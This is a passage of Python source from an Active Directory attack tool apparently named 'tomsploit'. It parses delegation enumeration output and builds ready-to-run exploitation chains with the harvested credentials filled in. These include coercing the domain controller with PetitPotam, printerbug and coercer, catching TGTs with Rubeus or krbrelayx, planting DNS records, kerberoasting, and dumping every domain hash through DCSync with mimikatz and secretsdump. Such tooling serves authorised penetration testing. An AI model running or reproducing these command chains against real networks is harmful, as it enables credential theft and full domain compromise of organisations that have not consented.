        for entry in r.commands:
            label = entry[0]
            if label in seen:
                continue
            seen.add(label)
            if label in intentionally_bare:
                continue
            if not _hint_for(label):
                missing.append(label)
    return missing



def _deleg_ctx_from(ctx: dict, s: "Success", ip: str, hostname: str,
                    maq: "int | None" = None) -> dict:
    """Delegation-emitter context derived from a built suggestion context.
    Shared by build_suggestions and the Reporter so the terminal summary and
    the written file can never disagree about what they are describing."""
    dom_p = ctx["dom_plain"]
    return {
        "dom_plain": dom_p,
        "ip": ip,
        "deleg_user": s.user,
        "cred_flag": (f"-hashes :{ctx['nthash']}" if s.is_hash
                      else f"-p {ctx['qpw']}"),
        # Raw secret + kind, for tools that take the credential differently
        # from impacket (bare positional, user:pass string, -hashes vs -p).
        "cred_secret": (ctx["nthash"] if s.is_hash else s.secret),
        "cred_is_hash": s.is_hash,
        # DC identity: lets the emitters spot a delegation SPN that points AT
        # the DC, which is domain compromise rather than a lateral move.
        "dc_short": hostname or "",
        "dc_fqdn": (f"{hostname}.{dom_p}"
                    if hostname and dom_p != "<DOMAIN>" else ""),
        "maq": maq,          # ms-DS-MachineAccountQuota (None = unknown)
        "roastable_sweep": [],   # filled in at the call sites below
    }


# Labels of blocks that are GATED on enrichment: emitted only when the
# enrichment pass actually found something for them. Matching is by label
# prefix so the PtH variants ("... [PtH]") are covered by the same entry.
_GATED_LABELS: dict[str, str] = {
    "LAPS / gMSA passwords": "laps_gmsa",
    "LAPS / gMSA passwords [PtH]": "laps_gmsa",
    "AD CS — find vulnerable templates": "adcs",
    "AD CS — find vulnerable templates [PtH]": "adcs",
    # covers both the password and [PtH] variants by prefix
    "delegation — enumerate": "delegation",
}


def _gate_key(label: str) -> str | None:
    for prefix, key in _GATED_LABELS.items():
        if label.startswith(prefix):
            return key
    return None


def _strip_notes(cmd: str) -> str:
    """Remove explanatory prose, keep runnable commands.

    Operates on LOGICAL commands (following backslash continuations) rather
    than physical lines: dropping a comment that sits between a command and
    its continuation would splice the two together. A group whose FIRST line
    is a comment is prose (or a commented-out alternative) and goes; anything
    else is a command and stays, continuations and all.

    Note this also drops commented-out alternatives. That is deliberate: they
    carry <PLACEHOLDER> values and are therefore not the next command, which
    is exactly the noise this mode exists to remove. --notes brings them back."""
    lines = cmd.split("\n")
    out: list[str] = []
    i = 0
    while i < len(lines):
        line = lines[i].rstrip()
        stripped = line.lstrip()
        if not stripped:
            i += 1
            continue
        group = [line]
        while group[-1].endswith("\\") and i + 1 < len(lines):
            i += 1
            group.append(lines[i].rstrip())
        if not stripped.startswith("#"):
            out.extend(group)
        i += 1
    return "\n".join(out)


def build_suggestions(s: Success, ip: str, hostname: str,
                      is_dc: bool, domain_fallback: str = "",
                      enrich: "TargetResult | None" = None,
                      deleg_inline: bool = True,
                      notes: bool = False
                      ) -> list[tuple[str, str]]:
    """Return [(label, command, hint), ...] follow-ups for a success.

    Each entry is a 3-tuple: the block label, the command text, and a one-line
    outcome hint ("" when the command has none). Hints are looked up on a
    normalised label so a password and its PtH variant share one hint.

    With `enrich` (a TargetResult carrying a completed enrichment pass), the
    delegation block is REPLACED by the routes that actually apply (or, unless
    deleg_inline, summarised and written to a file), and the LAPS/gMSA/ADCS
    blocks are dropped when the domain had nothing for them. Without it,
    behaviour is unchanged — every block prints, as before. `notes` keeps the
    explanatory comments; `bare` strips everything but the commands.

    Never raises — a malformed template is skipped rather than allowed to
    break the whole report."""
    try:
        ctx = build_context(s, ip, hostname, is_dc, domain_fallback)
    except Exception:
        return []
    gated = bool(enrich is not None and getattr(enrich, "enriched", False))
    out: list[tuple[str, str]] = []
    for rule in SUGGEST_RULES:
        if rule.auth != s.auth_type or rule.proto != s.protocol:
            continue
        if rule.dc is not None and rule.dc != is_dc:
            continue
        if rule.admin is not None and rule.admin != s.is_admin:
            continue
        for label, template in rule.commands:
            key = _gate_key(label) if gated else None
            if key == "delegation":
                # Enrichment already ran --find-delegation; emit the matched
                # branches instead of telling the operator to go run it.
                dom_p = ctx["dom_plain"]
                deleg_ctx = _deleg_ctx_from(ctx, s, ip, hostname, getattr(enrich, "maq", None))
                rows = getattr(enrich, "deleg_rows", [])
                if not deleg_inline:
                    # Rendered as a compact summary + its own file by the
                    # Reporter; emitting the full blocks here as well would
                    # defeat the point.
                    continue
                if rows:
                    out.extend((lb, cm, "")
                               for lb, cm in suggest_for_delegation(
                                   rows, deleg_ctx))
                else:
                    out.append(("delegation — none found",
                                "# --find-delegation returned no abusable "
                                "accounts on this domain.", ""))
                continue
            if key == "laps_gmsa" and not (
                    getattr(enrich, "laps_hits", []) or
                    getattr(enrich, "gmsa_hits", [])):
                continue
            if key == "adcs" and not getattr(enrich, "adcs_hits", []):
                continue
            try:
                cmd = template.format(**ctx)
            except Exception:
                continue
            if s.local_auth:
                cmd = _inject_local_auth(cmd)
            if not notes:
                cmd = _strip_notes(cmd)
                if not cmd.strip():
                    continue          # the block was prose only
            out.append((label, cmd, _hint_for(label)))
    return out


# ─── Delegation enumeration → matched branch ───────────────────────────
# The delegation rules above stop at "run the enumeration". This section
# closes the loop: it parses findDelegation / nxc --find-delegation output
# and emits ONLY the branch that applies, with account and target names
# already filled in — "next command, not a manual".
#
# Two producers, two column vocabularies. Verified against source
# (Pennyw0rth/NetExec nxc/protocols/ldap.py::find_delegation and
# fortra/impacket examples/findDelegation.py):
#
#   impacket  Unconstrained | Constrained w/o Protocol Transition |
#             Constrained w/ Protocol Transition | Resource-Based Constrained
#             cols: AccountName AccountType DelegationType DelegationRightsTo
#                   SPN Exists
#   nxc       Unconstrained | Constrained | Constrained w/ Protocol Transition |
#             Resource-Based Constrained
#             cols: AccountName AccountType DelegationType DelegationRightsTo
#
# Note the disagreement on the NO-transition label (impacket spells it out,
# nxc uses a bare "Constrained"). Both fold to DelegKind.CONSTRAINED. The
# phrase table is ordered longest-first so the bare "constrained" substring
# cannot steal a "w/ Protocol Transition" row.
#
# RBCD rows read INVERTED relative to the other three: AccountName is the
# principal already ALLOWED TO ACT (delegate-from) and DelegationRightsTo is
# the victim being acted upon (delegate-to). The emitter handles that so the
# produced commands put each host in the right slot.


class DelegKind(str, Enum):
    UNCONSTRAINED = "unconstrained"
    CONSTRAINED = "constrained"          # w/o protocol transition
    CONSTRAINED_PT = "constrained_pt"    # w/ protocol transition (T2A4D)
    RBCD = "rbcd"


_TYPE_PHRASES: tuple[tuple[str, DelegKind], ...] = (
    ("resource-based constrained", DelegKind.RBCD),
    ("constrained w/ protocol transition", DelegKind.CONSTRAINED_PT),
    ("constrained w/o protocol transition", DelegKind.CONSTRAINED),
    ("unconstrained", DelegKind.UNCONSTRAINED),
    # bare "constrained" LAST — nxc's no-transition label.
    ("constrained", DelegKind.CONSTRAINED),
)

_ANY_PHRASE_RE = re.compile(
    r"(resource-based constrained|constrained w/o protocol transition|"
    r"constrained w/ protocol transition|unconstrained|constrained)",
    re.IGNORECASE,
)

# nxc prefixes highlight lines with "LDAP <host> <port> <hostname>" and may
# carry an nxc marker; strip both so column 0 is AccountName.
_DELEG_PREFIX_RE = re.compile(
    r"^\s*(?:LDAP\s+\S+\s+\d+\s+\S+\s+)?(?:\[[-+*!?]\]\s+)?")

# Banner: LDAP <ip> <port> <hostname>. Match through the hostname token; the
# remainder (attribute column, including its leading pad) is returned intact.
_QUERY_BANNER_RE = re.compile(r"^\s*LDAP\s+\S+\s+\d+\s+\S+(?:\s+\[[-+*!?]\])?")

_ANSI_RE = re.compile(r"\x1b\[[0-9;]*m")


@dataclass
class DelegRow:
    account: str            # AccountName (verbatim)
    account_type: str       # AccountType (collapsed CN, or DN fragment)
    kind: DelegKind
    rights_to: list[str]    # DelegationRightsTo, split
    raw: str = ""
    # Filled by a second enrichment query (_enrich_roastability): the way INTO
    # this account. own_spn is the SPN registered ON the account (kerberoastable
    # if set); uac carries DONT_REQ_PREAUTH (AS-REP roastable). roast_checked
    # distinguishes "checked, not roastable" from "never checked" so the
    # emitters know whether to state a fact or fall back to a conditional.
    own_spn: str = ""
    uac: int = 0
    roast_checked: bool = False
    # msDS-AllowedToDelegateTo — the FULL constrained-delegation target list
    # (findDelegation shows only the first). Lets DC-targeting detection and
    # the "also reaches" list be authoritative rather than first-match.
    allowed_to: list = field(default_factory=list)
    # Direct-ACE write check (daclread, per account). None = not checked;
    # [] = checked, no direct dangerous ACE; list = trustees with a direct write.
    direct_writers: list | None = None

    @property
    def is_computer(self) -> bool:
        return self.account.endswith("$") or "computer" in self.account_type.lower()

    @property
    def kerberoastable(self) -> bool:
        return bool(self.own_spn)

    @property
    def asrep_roastable(self) -> bool:
        return bool(self.uac & 0x400000)      # DONT_REQ_PREAUTH

    @property
    def disabled(self) -> bool:
        return bool(self.uac & 0x2)           # ACCOUNTDISABLE — route is dead


def _deleg_clean(line: str) -> str:
    return _ANSI_RE.sub("", line).rstrip("\n")


def _deleg_is_separator(line: str) -> bool:
    s = line.strip()
    return bool(s) and set(s) <= {"-", " "}


def _deleg_split_rights(blob: str) -> list[str]:
    """DelegationRightsTo may be 'N/A', one SPN, or several. nxc joins a list
    with ', '; impacket separates with whitespace and rides its 'SPN Exists'
    boolean at the end of the row. Split on commas/whitespace, drop a trailing
    True/False, drop a bare N/A."""
    parts = [p for p in re.split(r"[,\s]+", blob.strip()) if p]
    if parts and parts[-1] in ("True", "False"):
        parts = parts[:-1]
    return [p for p in parts if p.upper() != "N/A"]


# Access-mask names (from nxc daclread's SIMPLE_PERMISSIONS + object-ACE flags)
# that grant a write powerful enough to matter for delegation abuse: setting an
# SPN, writing msDS-AllowedToActOnBehalfOfOtherIdentity, or msDS-KeyCredentialLink.
_DANGEROUS_WRITE = ("FullControl", "Modify", "ReadAndWrite", "Write",
                    "WriteProperty", "WriteDacl", "WriteOwner", "GenericAll",
                    "GenericWrite", "Self")


def _clean_ext(s: str, maxlen: int = 256) -> str:
    """Sanitize an externally-controlled string (an AD object name, a trustee,
    an SPN — anything an attacker could set) before it enters the rendered
    file. Newlines and control characters are the real risk: they can break a
    value out of its comment line and land as executable text. shlex.quote
    protects command ARGUMENTS, but these values also appear in comment lines
    and prose, which are not quoted — so strip anything that could escape the
    line, and cap the length so one absurd value cannot blow up the file."""
    if not s:
        return ""
    # collapse any run of control chars (incl. newlines, tabs, ANSI, NUL) to a
    # single space; keep printable content intact.
    cleaned = _ANSI_RE.sub("", str(s))     # drop ANSI colour sequences whole
    cleaned = _re_ctl.sub(" ", cleaned)    # then any remaining control chars
    cleaned = cleaned.strip()
    if len(cleaned) > maxlen:
        cleaned = cleaned[:maxlen] + "…"
    return cleaned


_re_ctl = re.compile(r"[\x00-\x1f\x7f]+")


def _clean_list(items, maxlen: int = 256) -> list:
    """_clean_ext over a list, dropping empties."""
    out = []
    for it in (items or []):
        c = _clean_ext(it, maxlen)
        if c:
            out.append(c)
    return out


def _parse_dacl_writers(text: str) -> list[str]:
    """From nxc `-M daclread` output for ONE object, return the trustees that
    hold a direct write-class ACE. daclread prints, per ACE, 'ACE[n] info' then
    indented 'Trustee (name)  : <name>' and 'Access mask : <names> (0x..)'. We
    pair each trustee with the mask that follows it and keep the dangerous ones.

    This sees ONLY direct ACEs — daclread cannot resolve group-inherited rights
    (its own docs say so), so a clean result does NOT mean 'no one can write',
    only 'no DIRECT ACE'. The caller says as much and points at BloodHound."""
    writers: list[str] = []
    cur_trustee = ""
    for raw in text.splitlines():
        line = _ANSI_RE.sub("", raw)
        low = line.lower()
        if "trustee (name)" in low:
            cur_trustee = line.split(":", 1)[1].strip() if ":" in line else ""
        elif "access mask" in low and cur_trustee:
            mask = line.split(":", 1)[1] if ":" in line else ""
            if any(p in mask for p in _DANGEROUS_WRITE):
                # strip a trailing SID in parens nxc appends to the name
                name = _clean_ext(cur_trustee.split(" (")[0].strip(), 128)
                if name and name.upper() not in ("UNKNOWN",) and name not in writers:
                    writers.append(name)
            cur_trustee = ""
    return writers


def _parse_maq(text: str) -> "int | None":
    """Pull the integer from nxc `-M maq` output ('MachineAccountQuota: N')."""
    if not text:
        return None
    m = _re_hints.search(r"MachineAccountQuota:\s*(\d+)", text)
    return int(m.group(1)) if m else None


def _parse_roast_sweep(text: str) -> list[str]:
    """sAMAccountName values from an LDAP --query for SPN-bearing user
    accounts. One fast query (no per-account TGS requests) so it works
    through a pivot and stays quiet. Output format (verified vs nxc source
    ldap.py::query): 'sAMAccountName       <value>' per object, attribute name
    left-padded to 20, no marker. Preserves original case; drops krbtgt."""
    names: list[str] = []
    if not text:
        return names
    for raw in text.splitlines():
        line = _ANSI_RE.sub("", raw)
        m = _QUERY_BANNER_RE.match(line)
        body = (line[m.end():] if m else line).lstrip(" \t")
        parts = body.split(None, 1)
        if len(parts) == 2 and parts[0].lower() == "samaccountname":
            n = _clean_ext(parts[1].strip(), 64)
            if n and n.lower() != "krbtgt" and n not in names:
                names.append(n)
    return names


def _parse_roast_query(text: str) -> dict[str, dict]:
    """Parse `nxc ldap --query` output into {sAMAccountName_lower: {spn, uac}}.

    nxc prints one block per object (verified against source
    nxc/protocols/ldap.py::query):

        [+] Response for object: CN=beth,...,DC=...
        sAMAccountName       beth.richards
        servicePrincipalName TERMSRV/DC01.INLANEFREIGHT.LOCAL
                             TERMSRV/DC01
        userAccountControl   590336

    Attribute name is left-padded to 20 cols; a multi-valued attribute
    continues on indented lines with a blank name. We track the current
    attribute so continuation lines attach to it, and key each record by its
    sAMAccountName (falling back to the DN's CN if the attribute is absent)."""
    records: dict[str, dict] = {}
    cur: dict | None = None
    cur_attr = ""
    cur_sam = ""

    def commit():
        nonlocal cur, cur_sam, cur_attr
        if cur is not None:
            key = (cur_sam or cur.get("_cn", "")).lower()
            if key:
                records[key] = {"spn": _clean_ext(cur.get("spn", ""), 128),
                                "uac": cur.get("uac", 0),
                                "allowed_to": _clean_list(cur.get("allowed_to", []), 128)}
        cur = None
        cur_sam = ""
        cur_attr = ""

    for raw in text.splitlines():
        line = _ANSI_RE.sub("", raw).rstrip()
        if not line.strip():
            continue
        marker, msg = parse_nxc_line(line)
        low = line.lower()

        # New object block: [+]/[*] "Response for object: <DN>"
        if "response for object:" in low:
            commit()
            cur = {}
            cur_attr = ""
            cur_sam = ""
            dn = line.split(":", 1)[1].strip() if ":" in line else ""
            # first CN in the DN, best-effort fallback key
            m = re.search(r"CN=([^,]+)", dn, re.IGNORECASE)
            if m:
                cur["_cn"] = m.group(1)
            continue

        if cur is None or marker is not None:
            # status line ([+]/[-]) that is not an object header: ignore
            continue

        # Strip nxc's LDAP banner but KEEP the column padding after it: the
        # 'LDAP <host> <port> <hostname> ' prefix is fixed-width, so a
        # continuation line (blank attribute name) is distinguished from a new
        # attribute only by the spaces that follow. The generic prefix regex
        # eats trailing whitespace, so use a banner-only strip here.
        m_ban = _QUERY_BANNER_RE.match(line)
        body = line[m_ban.end():] if m_ban else line
        if not body.strip():
            continue
        body = body.lstrip(" \t")            # normalise; we key on the token

        # An attribute line starts with a known attribute name; anything else
        # (while we are inside an object) is a continuation value of the
        # current multi-valued attribute. This is robust to column padding.
        _KNOWN_ATTRS = ("samaccountname", "serviceprincipalname",
                        "useraccountcontrol", "msds-allowedtodelegateto")
        first = body.split(None, 1)
        head = first[0].lower() if first else ""
        if head in _KNOWN_ATTRS:
            cur_attr = first[0]
            value = first[1].strip() if len(first) > 1 else ""
        elif cur_attr.lower() == "msds-allowedtodelegateto":
            # ONLY the multi-valued attribute takes continuation lines. A
            # non-attribute line while a single-valued attr is current is
            # noise/truncation — ignore it rather than clobber the value.
            value = body.strip()
        else:
            continue

        al = cur_attr.lower()
        if al == "samaccountname":
            if value:                          # never overwrite a good name with junk
                cur_sam = value
        elif al == "serviceprincipalname":
            if value and not cur.get("spn"):
                cur["spn"] = value          # first SPN is enough to prove roastable
        elif al == "useraccountcontrol":
            try:
                cur["uac"] = int(value)
            except ValueError:
                pass
        elif al == "msds-allowedtodelegateto":
            # multi-valued: continuation lines append (handled by cur_attr)
            cur.setdefault("allowed_to", [])
            if value:
                cur["allowed_to"].append(value)
    commit()
    return records


def parse_delegation_output(text: str) -> list[DelegRow]:
    """Parse pasted findDelegation / nxc --find-delegation table output.

    Anchors on DelegationType (the only multi-word column) and splits around
    it, so SPN lists containing spaces/commas survive intact. Returns [] on
    anything unparseable — never raises."""
    rows: list[DelegRow] = []
    if not text:
        return rows
    for raw_line in text.splitlines():
        line = _deleg_clean(raw_line)
        if not line.strip() or _deleg_is_separator(line):
            continue
        if "delegationtype" in line.lower():      # header row
            continue
        m = _ANY_PHRASE_RE.search(line)
        if not m:
            continue
        found = m.group(1).lower()
        kind: DelegKind | None = None
        for phrase, k in _TYPE_PHRASES:
            if phrase in found:
                kind = k
                break
        if kind is None:
            continue

        head = _DELEG_PREFIX_RE.sub("", line[: m.start()]).strip()
        tail = line[m.end():].strip()
        tokens = head.split()
        if not tokens:
            continue
        rows.append(DelegRow(
            account=_clean_ext(tokens[0], 64),
            account_type=_clean_ext(" ".join(tokens[1:]) if len(tokens) > 1 else "", 128),
            kind=kind,
            rights_to=_clean_list(_deleg_split_rights(tail), 128),
            raw=line,
        ))
    return rows


# ── branch emitters ─
# Each returns [(label, command)] in the same shape build_suggestions uses, so
# the existing renderer prints them unchanged. Values that enumeration simply
# cannot know (an uncracked password, a CA name, the DC's NetBIOS name) stay
# as <ANGLE> literals — matching the rest of tomsploit, and keeping --sh mode
# able to comment them out.

def _safe_filename_part(s: str) -> str:
    """A username may contain characters that are awkward or unsafe in a
    filename (backslash from DOMAIN\\user, spaces, dots at the ends). Keep
    it recognisable but filesystem-safe."""
    s = (s or "").strip()
    if "\\" in s:            # DOMAIN\user -> user
        s = s.split("\\")[-1]
    out = "".join(c if (c.isalnum() or c in "-_.") else "_" for c in s)
    return out.strip("._") or ""


def _deleg_known(ctx: dict) -> dict:
    """Resolve the values the scan ALREADY established, so they stop being
    placeholders. The DC's NetBIOS name and FQDN, the account you are
    authenticating as and its secret are all known by the time delegation is
    emitted — leaving them as <ANGLE> made the file look less finished than
    it was and forced a manual substitution pass before anything would run.

    Only genuinely unknowable values stay bracketed: a credential you have
    not obtained yet, a ticket blob that does not exist until runtime, and
    your own tunnel IP (which follows tomsploit's $LHOST convention)."""
    dom = ctx.get("dom_plain") or "<DOMAIN>"
    short = (ctx.get("dc_short") or "").strip()
    fqdn = (ctx.get("dc_fqdn") or "").strip()
    if not fqdn and short and dom != "<DOMAIN>":
        fqdn = f"{short}.{dom}"
    you = (ctx.get("deleg_user") or "").strip()
    you_cred = (ctx.get("cred_flag") or "").strip()
    secret = (ctx.get("cred_secret") or "").strip()
    is_hash = bool(ctx.get("cred_is_hash"))
    return {
        "dom": dom,
        "ip": ctx.get("ip") or "<DC-IP>",
        "dc_nb": short or "<DC-NETBIOS>",
        "dc_fqdn": fqdn or "<dc.fqdn>",
        "you": you or "<you>",
        "you_principal": (dom + chr(92) + you) if you else (dom + chr(92) + "<you>"),
        "you_cred": you_cred or "-p '<PASSWORD>'",
        # Raw secret + kind for non-impacket tools. When unknown (offline with
        # no cred), fall back to a placeholder of the right shape.
        "secret": secret or ("<nthash>" if is_hash else "<pw>"),
        "is_hash": is_hash,
        # An attacker-controlled DNS record name is arbitrary; emit a concrete
        # one rather than a placeholder so the line runs as written.
        "fake": "tomsploit01",
    }


def _route(get: str, required, missing, why: str = "") -> str:
    """Standard header for every delegation route. Four factual fields, no
    ranking — the operator decides which route to take, the tool states what
    each one is:

        GET      — what you end up holding if the steps succeed
        REQUIRED — the COMPLETE prerequisite list to run these commands
        MISSING  — the subset of REQUIRED you do NOT yet hold, each with the
                   way to get it; or "nothing — every prerequisite is met" when
                   the block is runnable as written
        WHY      — mechanism, only where it is not obvious from the commands

    required/missing may be a string or a list of strings (rendered as
    sub-bullets). MISSING is what makes the file actionable: it separates
    'this needs a hash you have not cracked' from 'run this now'."""
    def block(tag: str, val) -> list[str]:
        if isinstance(val, (list, tuple)):
            val = [v for v in val if v]
            if not val:
                return []
            head = f"# {tag:<8}: {val[0]}"
            rest = [f"#           {v}" for v in val[1:]]
            return [head, *rest]
        return [f"# {tag:<8}: {val}"] if val else []

    out = block("GET", get) + block("REQUIRED", required) + block("MISSING", missing)
    if why:
        out += block("WHY", why)
    return "\n".join(out) + "\n#\n"


def _deleg_account_is_self(account: str, ctx: dict) -> bool:
    """True when the delegating account IS the account the scan authenticated
    as — so its secret is ALREADY HELD and the tool must not tell you to
    kerberoast for a password you logged in with. Case-insensitive, tolerant
    of the trailing $ on a machine account."""
    you = (ctx.get("deleg_user") or "").strip().lower()
    if not you or you.startswith("<"):
        return False
    a = (account or "").strip().lower()
    return a == you or a.rstrip("$") == you.rstrip("$")


def _missing_secret(row: DelegRow, ctx: dict | None = None) -> str:
    """The MISSING line for an account whose secret you do not hold. Returns ""
    when the secret is ALREADY HELD (the account is the one you authenticated
    as), so the caller reports 'nothing' instead of a roast command."""
    if ctx is not None and _deleg_account_is_self(row.account, ctx):
        return ""
    acct = row.account
    host = acct.rstrip("$")
    if row.roast_checked:
        if row.kerberoastable:
            return f"{acct}'s secret — kerberoast now (cmd below)"
        if row.asrep_roastable:
            return f"{acct}'s secret — AS-REP roast now (cmd below)"
        if not row.is_computer:
            return f"{acct}'s secret — not roastable; plant an SPN (GenericWrite) or dump"
        return f"{acct}'s hash — dump, or SYSTEM on {host}"
    # unchecked (offline --deleg-in): state the conditional honestly
    if row.is_computer:
        return f"{acct}'s hash — dump, SYSTEM on {host}, or RBCD onto it"
    return f"{acct}'s secret — kerberoast if it has an SPN, else dump"


def _coerce_block(ctx: dict, listener: str, as_comment: bool = False) -> str:
    """The actual coercion command — the step every unconstrained write-up
    hand-waves as 'coerce the DC'. Fires PetitPotam/PrinterBug/etc at the DC
    so it authenticates to LISTENER. nxc's coerce_plus tries every method and
    reports which land; a single method via the standalone tools is the
    fallback. `listener` is the name/IP the DC will authenticate to (for the
    unconstrained chain this MUST be the krbrelayx host's name, so its SPN
    resolves)."""
    k = _deleg_known(ctx)
    you, cred, ip, dom = k["you"], k["you_cred"], k["ip"], k["dom"]
    secret, is_hash = k["secret"], k["is_hash"]
    p = "# " if as_comment else ""

    # Each tool takes the credential differently. Use the SAME secret we
    # authenticated with, formatted per tool, so these run as written.
    # PetitPotam / coercer: -hashes LM:NT or -p pass. printerbug: it goes in the
    # domain/user:pass target string and does not take a hash, so for a
    # hash-only cred we say so rather than emit a broken line.
    if is_hash:
        pp_cred = f"-hashes {secret}"
        co_cred = f"-hashes {secret}"
        pb_line = (f"{p}#   printerbug.py takes a password, not a hash — use "
                   f"PetitPotam/coercer above, or pass -hashes via its "
                   f"impacket build\n")
    else:
        pp_cred = f"-p {q(secret)}"
        co_cred = f"-p {q(secret)}"
        pb_line = (f"{p}#   printerbug.py "
                   f"{q(dom + '/' + you + ':' + secret)}@{ip} {listener}\n")

    return (
        f"{p}# coercion — which methods fire at your listener:\n"
        f"{p}nxc smb {ip} -u {you} {cred} -M coerce_plus -o LISTENER={listener}\n"
        f"{p}# or one standalone method (any ONE):\n"
        f"{p}python3 PetitPotam.py -u {you} {pp_cred} {listener} {ip}\n"
        + pb_line
        + f"{p}#   coercer.py coerce -u {you} {co_cred} -t {ip} -l {listener}\n")


def _missing_or_nothing(items, row: DelegRow, ctx: dict):
    """Finalize a MISSING list: drop satisfied (empty) entries; if none remain,
    state it positively — naming WHY when the account is the one you
    authenticated as."""
    items = [i for i in items if i]
    if items:
        return items
    if _deleg_account_is_self(row.account, ctx):
        return f"nothing — held (you are authenticated as {row.account})"
    return "nothing — commands below run as-is"


def _unconstrained_user_missing(row: DelegRow, ctx: dict | None = None):
    """MISSING for unconstrained delegation on a USER. Two prerequisites — the
    secret and an SPN on the account — and the roast query resolved BOTH: it
    pulled servicePrincipalName, so we know whether the SPN exists."""
    out = [_missing_secret(row, ctx)]
    if row.roast_checked:
        if row.own_spn:
            out.append(f"SPN — present ({_clean_ext(row.own_spn)}), nothing to add")
        else:
            _dw_raw = getattr(row, "direct_writers", None)
            dw = _clean_list(_dw_raw)
            if dw:
                out.append(f"SPN — none; but {', '.join(dw)} can write it "
                           f"(add an SPN, then roast)")
            elif _dw_raw == []:
                out.append("SPN — none, and no DIRECT write ACE (group rights "
                           "invisible to daclread — check BloodHound), else dead")
            else:
                out.append("SPN — none; add one (needs GenericWrite) or dead")
    else:
        out.append("SPN — verify with the query below")
    return out


def _emit_unconstrained(row: DelegRow, ctx: dict) -> list[tuple[str, str]]:
    """Unconstrained delegation. A COMPUTER account is a host you can land on
    and run a TGT catcher from. A USER account is not — there is no shell to
    get; it is a service identity, and abusing it means holding its
    credential and standing the service up yourself."""
    k = _deleg_known(ctx)
    dom, ip = k["dom"], k["ip"]
    acct = row.account
    dnsline = (f"python3 dnstool.py -u {q(k['you_principal'])} {k['you_cred']} \\\n"
               f"  -r {k['fake']}.{dom} -d $LHOST -a add {ip}")

    if row.is_computer:
        host = acct.rstrip("$")
        return [(
            f"UNCONSTRAINED on {host} (computer) — capture a DC TGT",
            _route(
                get="DCSync — every hash in the domain (incl. krbtgt)",
                required=[f"SYSTEM on {host}, or {host}'s machine hash",
                          "ability to coerce the DC"],
                missing=f"a foothold on {host} — you hold neither yet "
                        f"(a payoff for a host you own, not a way in)",
                why=f"{acct} decrypts any TGT forwarded to it, and it is not "
                    f"a DC — so coerce the DC to it and catch the TGT")
            + f"# ══ PATH (a): elevated shell ON {host} ══\n"
              f"# 1. start the catcher (elevated PowerShell), leave running:\n"
              f"Rubeus.exe monitor /interval:5 /nowrap /filteruser:{k['dc_nb']}$\n"
              f"# 2. coerce the DC to {host}:\n"
              + _coerce_block(ctx, host)
              + f"# 3. Rubeus prints a base64 TGT — inject it on {host}:\n"
              f"Rubeus.exe ptt /ticket:<base64-blob>\n"
              f"# 4. DCSync from {host}:\n"
              f"Rubeus.exe ptt /ticket:<base64-blob> ; "
              f"mimikatz # lsadump::dcsync /domain:{dom} /all\n"
              f"#\n"
              f"# ══ PATH (b): {host}'s machine hash, from Kali ══\n"
              f"# 1. start krbrelayx (foreground; writes a .ccache on receipt):\n"
              f"krbrelayx.py -hashes :<{host}-nthash>\n"
              f"# 2. DNS record so the DC resolves your listener by NAME:\n"
              f"{dnsline}\n"
              f"# 3. coerce the DC to that NAME (second terminal):\n"
              + _coerce_block(ctx, k['fake'] + '.' + dom)
              + f"# 4. DCSync with the dropped ccache:\n"
              f"export KRB5CCNAME='{k['dc_nb']}$@{dom}.ccache'\n"
              f"impacket-secretsdump -k -no-pass -just-dc {k['dc_fqdn']}",
        )]

    return [(
        f"UNCONSTRAINED on {acct} (user) — capture a DC TGT",
        _route(
            get="DCSync — every hash in the domain (incl. krbtgt)",
            required=[f"{acct}'s secret", f"an SPN on {acct}"],
            missing=_unconstrained_user_missing(row, ctx),
            why=f"a user only receives a forwarded TGT when a client "
                f"authenticates to one of its SPNs, so you must become that "
                f"service")
        + _deleg_getcred_block(row, ctx)
        + f"# 1. start krbrelayx with {acct}'s hash (foreground, writes ccache):\n"
          f"krbrelayx.py -hashes :<{acct}-nthash>\n"
          f"# 2. point one of {acct}'s SPN hostnames at you via DNS:\n"
          f"{dnsline}\n"
          f"# 3. coerce the DC to that SPN name (second terminal):\n"
          + _coerce_block(ctx, k['fake'] + '.' + dom)
          + f"# 4. DCSync with the dropped ccache:\n"
          f"export KRB5CCNAME='{k['dc_nb']}$@{dom}.ccache'\n"
          f"impacket-secretsdump -k -no-pass -just-dc {k['dc_fqdn']}",
    )]


def _spn_host_is_dc(spn_host: str, ctx: dict) -> bool:
    """True when a delegation SPN points at the domain controller itself.

    This is the difference between a lateral move and instant domain
    compromise: sname substitution can change the service CLASS but not the
    HOST (the ticket is encrypted with that host's key). If the host is
    already the DC, swapping to ldap/ turns the ticket into DCSync."""
    if not spn_host:
        return False
    h = spn_host.lower().rstrip(".")
    short = h.split(".", 1)[0]
    dc_fqdn = (ctx.get("dc_fqdn") or "").lower().rstrip(".")
    dc_short = (ctx.get("dc_short") or "").lower()
    return bool((dc_fqdn and h == dc_fqdn) or (dc_short and short == dc_short))


def _impacket_self(ctx: dict) -> str:
    """The identity + auth for an impacket tool authenticating as the OPERATOR
    (the account the scan ran as). impacket example scripts (rbcd, addcomputer,
    getST, secretsdump, ...) take the password in the identity positional as
    domain/user:password — they have NO -p flag. So a password credential must
    be embedded, not passed as a flag; a hash uses -hashes. Verified against
    fortra/impacket rbcd.py + addcomputer.py.

    Returns e.g.  'CORP.LOCAL/operator:P@ss'   or
                  'CORP.LOCAL/operator' -hashes :abc123
    Falls back to a placeholder identity when the secret is not known."""
    dom = ctx.get("dom_plain") or "<DOMAIN>"
    you = (ctx.get("deleg_user") or "").strip() or "<you>"
    secret = (ctx.get("cred_secret") or "").strip()
    principal = f"{dom}/{you}"
    if not secret:
        return q(f"{principal}:<PASSWORD>")          # unknown (offline)
    if ctx.get("cred_is_hash"):
        return f"{q(principal)} -hashes :{secret}"
    return q(f"{principal}:{secret}")


def _getst_auth(dom: str, account: str, row: "DelegRow | None" = None,
                known_pw: str = "", ctx: dict | None = None) -> str:
    """The identity + auth portion of an impacket getST command.

    getST has NO -p flag (verified against source: the only auth options are
    -hashes / -aesKey / -k -no-pass). A PASSWORD must go INSIDE the identity
    positional as domain/user:password. This returns, correctly quoted:

        'DOM/beth:<beth-PASSWORD>'                 user, password (from a roast)
        'DOM/DMZ01$' -hashes :<DMZ01-nthash>       machine, hash (from a dump)
        'DOM/TOMPC$:TomsploitAdd1!'                a password you already hold

    A machine account defaults to the -hashes form because its cleartext is
    random and rotated; a user to the identity-password form because that is
    what cracking a roast yields. Either can be swapped for any other auth form
    per the file header — this is just the one you are likeliest to hold."""
    principal = f"{dom}/{account}"
    # If this IS the account we authenticated as, we hold its real secret — use
